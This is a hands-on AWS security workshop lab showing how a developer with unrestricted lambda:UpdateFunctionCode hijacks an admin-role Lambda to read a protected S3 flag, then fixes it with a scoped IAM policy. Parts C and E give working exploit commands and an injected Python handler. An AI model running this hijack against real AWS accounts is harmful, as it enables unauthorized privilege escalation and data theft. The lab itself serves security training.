# Lab 6: Lambda UpdateFunctionCode — Existing PassRole via Function Hijacking

## Scenario 4: Lambda UpdateFunctionCode — Existing PassRole via Function Hijacking

**Category:** Existing PassRole
**Starting Identity:** `iamws-lambda-developer-user`
**Target:** Crown jewels via hijacking `iamws-privileged-lambda` (execution role: `iamws-privileged-lambda-role` with `AdministratorAccess`)

**The Vulnerability:**
- Lambda functions are serverless compute functions that run code when invoked
- Lambda functions use attached **execution roles** to make AWS API calls to other AWS services
- In our scenario, `iamws-lambda-developer-user` can update the code of ANY Lambda function — including a function called `iamws-privileged-lambda`, which runs with a dangerously permissive execution role with `AdministratorAccess` permissions.
- By replacing the function code with a malicious payload, the developer's code executes with `AdministratorAccess` permissions in AWS via the lambda function.

### A note on the identities you'll switch between

This lab involves three identities.

| Identity | What it is | When you use it |
| --- | --- | --- |
| `iamws-lambda-developer-user` | The attacker. A developer who can overwrite the code of any Lambda function. | Parts A, C & E: recon, the exploit, and the re-test |
| `iamws-privileged-lambda-role` | The admin-tier execution role attached to the target Lambda. | Not a profile you switch to — your injected code runs *as* this role when the function executes |
| `iamws-lab-default` | Your admin identity (acting as the defender). | Part D: the defense, and refreshing the recon graph |

### Part A: Identify with iam-recon

Run the pathfinding scan scoped to this scenario's principal:

```bash
iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-lambda-developer-user
```

Expected output:
```
Pathfinding.cloud
  Database: N known escalation paths bundled

  user/iamws-lambda-developer-user — 2 paths matched:

  [lambda-004] UpdateFunctionCode + InvokeFunction (existing-passrole)
    Permissions: lambda:UpdateFunctionCode, lambda:InvokeFunction
    https://www.pathfinding.cloud/paths/lambda-004

  [lambda-003] UpdateFunctionCode (existing-passrole)
    Permissions: lambda:UpdateFunctionCode
    https://www.pathfinding.cloud/paths/lambda-003
```

Confirm the specific permission:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-lambda-developer-user \
  --action lambda:UpdateFunctionCode
```

Expected output:
```
ALLOW user/iamws-lambda-developer-user can call lambda:UpdateFunctionCode with *
```

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/lambda-003](https://pathfinding.cloud/paths/lambda-003):

- **Category:** Existing PassRole
- **Required permission:** `lambda:UpdateFunctionCode` (unrestricted)
- **Root cause:** Can modify ANY Lambda, not just designated ones
- **Impact:** Access to any Lambda's execution role

Unlike "New PassRole" (Scenario 3) where you create new compute with a privileged role, "Existing PassRole" exploits compute that **already has a privileged role attached** — you just swap in your code.

### Part C: Exploit the Vulnerability

**Step 1: Try the crown jewels — you're denied**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-lambda-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-lambda-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 2: Find the privileged Lambda**

```bash
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table --profile iamws-lambda-developer-user
```

You'll see `iamws-privileged-lambda` with `iamws-privileged-lambda-role` — an admin-tier execution role.

**Step 3: Confirm the target function's role**

```bash
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text \
  --profile iamws-lambda-developer-user
```

**Step 4: Save the hash for the original code the Lambda is currently configured with**

```bash
ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.CodeSha256' --output text \
  --profile iamws-lambda-developer-user)
echo "Original hash: $ORIGINAL_HASH"
```

Expected output is similar to the following:

```
Original hash: UICXkyne1cumrq6E1GRqIafrb4NjgQ4Z7fULur/ZRPM=
```

**Step 5: Write the malicious code you will inject into the Lambda function**

```bash
mkdir -p /tmp/iamws-exploit
cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
import boto3
def handler(event, context):
    sts = boto3.client('sts')
    s3 = boto3.client('s3')
    identity = sts.get_caller_identity()
    bucket = f"iamws-crown-jewels-{identity['Account']}"
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    return {
        'statusCode': 200,
        'identity': {'Arn': identity['Arn']},
        'crown_jewels': obj['Body'].read().decode('utf-8')
    }
PYEOF
```

**Step 6: Package the payload**

```bash
cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py && cd -
```

**Step 7: Replace the function code with your new malicious version**

```bash
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/iamws-exploit/exploit.zip \
  --profile iamws-lambda-developer-user
```

No error — the developer updated the function code.

**Step 8: Invoke the Lambda function to run the code**

This command will invoke the Lambda function, and save its response to `/tmp/iamws-exploit/response.json`

```bash
aws lambda invoke --function-name iamws-privileged-lambda \
  --payload '{}' /tmp/iamws-exploit/response.json \
  --profile iamws-lambda-developer-user
```

**Step 9: Read the response**

```bash
cat /tmp/iamws-exploit/response.json | jq .
```

Expected output:
```json
{
  "statusCode": 200,
  "identity": {
    "Arn": "arn:aws:sts::<aws account id>:assumed-role/iamws-privileged-lambda-role/iamws-privileged-lambda"
  },
  "crown_jewels": "  ============================================\n     YOU FOUND THE CROWN JEWELS! ..."
}
```

The Lambda ran as `iamws-privileged-lambda-role` — the developer never directly assumed the role, but the malicious code executed as `AdministratorAccess` and was able to talk to S3 and return the S3 object contents in the Lambda function response.

### Part D: Apply the Defense

You will run all defense steps as your admin identity.

**Step 1: Apply a scoped inline policy to the developer user**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam put-user-policy \
  --user-name iamws-lambda-developer-user \
  --policy-name SecureLambdaDeveloper \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "AllowLambdaCodeUpdateDevOnly",
        "Effect": "Allow",
        "Action": ["lambda:UpdateFunctionCode","lambda:InvokeFunction"],
        "Resource": "arn:aws:lambda:*:'${ACCOUNT_ID}':function:dev-*"
      },
      {
        "Sid": "AllowLambdaReadAll",
        "Effect": "Allow",
        "Action": ["lambda:GetFunction","lambda:ListFunctions"],
        "Resource": "*"
      }
    ]
  }'
```

The important update is: `Resource: "*"` → `Resource: "arn:aws:lambda:*:ACCOUNT:function:dev-*"`. The developer can still update functions in a certain namespace; privileged functions like `iamws-privileged-lambda` are out of scope. (Note that this is just an example, it would still be easy to escalate privileges if, for example, the developer has permissions to create new a lambda function with a name matching the namespace).

**Step 2: Detach the overly-permissive original policy**

```bash
aws iam detach-user-policy \
  --user-name iamws-lambda-developer-user \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-lambda-developer-policy 2>/dev/null || true
```

**Step 3: Wait for AWS IAM permission changes to take effect**

Wait a short amount of time for the IAM changes to propagate.

### Part E: Verify the Remediation

**Step 1: Create a dummy payload (representing more malicious code)**

```bash
echo "def handler(e,c): pass" > /tmp/dummy_lambda.py
cd /tmp && zip -j /tmp/dummy_lambda.zip dummy_lambda.py && cd -
```

**Step 2: Try to update the privileged Lambda**

```bash
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/dummy_lambda.zip \
  --profile iamws-lambda-developer-user 2>&1 | head -3
```

Expected output:
```
An error occurred (AccessDeniedException) when calling the UpdateFunctionCode operation:
User: arn:aws:iam::<aws account id>:user/iamws-lambda-developer-user
is not authorized to perform: lambda:UpdateFunctionCode on resource: ...iamws-privileged-lambda
```

**Step 3: Verify with iam-recon**

Refresh the graph:

```bash
iam-recon graph create --profile iamws-lab-default
```

Re-run the pathfinding scan scoped to this principal:

```bash
iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-lambda-developer-user
```

Expected output:
```
  user/iamws-lambda-developer-user — no known paths matched.
```

The `[lambda-003]` and `[lambda-004]` entries are gone.

Confirm the specific action is denied on the privileged function:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-lambda-developer-user \
  --action lambda:UpdateFunctionCode \
  --resource "arn:aws:lambda:*:${ACCOUNT_ID}:function:iamws-privileged-lambda"
```

Expected output:
```
DENY user/iamws-lambda-developer-user cannot call lambda:UpdateFunctionCode with arn:aws:lambda:*:<aws account id>:function:iamws-privileged-lambda
```

### What You Learned

- `lambda:UpdateFunctionCode` with `Resource: "*"` allows hijacking any Lambda function. The attack path never requires `iam:PassRole` — you update existing compute that already has a privileged role attached.
- **Resource constraints** (`dev-*` ARN pattern) allow you to scope policies using certain namespaces. (This is not a foolproof best practice, just a conceptual example)
- AWS IAM has a short-lived permission cache (~3–5 minutes) for Lambda — wait before verifying live, or use `simulate-principal-policy` for immediate offline confirmation.